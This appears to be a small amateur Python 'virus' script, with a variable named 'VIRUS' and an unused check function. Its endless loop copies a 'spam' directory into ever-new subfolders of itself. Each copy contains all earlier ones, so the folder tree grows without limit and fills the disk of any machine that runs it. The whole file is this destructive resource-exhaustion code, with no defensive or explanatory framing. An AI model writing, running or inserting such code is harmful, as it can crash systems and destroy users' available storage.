import shutil
import os
import sys
from time import sleep

num = 0
num2 = 0
text = str(num)
tct = 'VIRUS'+ text +'.txt'
txt = 'spam/' + tct
dirName = 'spam'

def check():
  try:
    shutil.copy('y.txt', 'tested for folder')
    return True
  except FileNotFoundError:
    return False


while True:
  num += 1
  text = str(num)
  tct = 'spam ' + text
  txt = 'spam/' + tct
  shutil.copytree('spam', txt)
  print('created folder', tct)
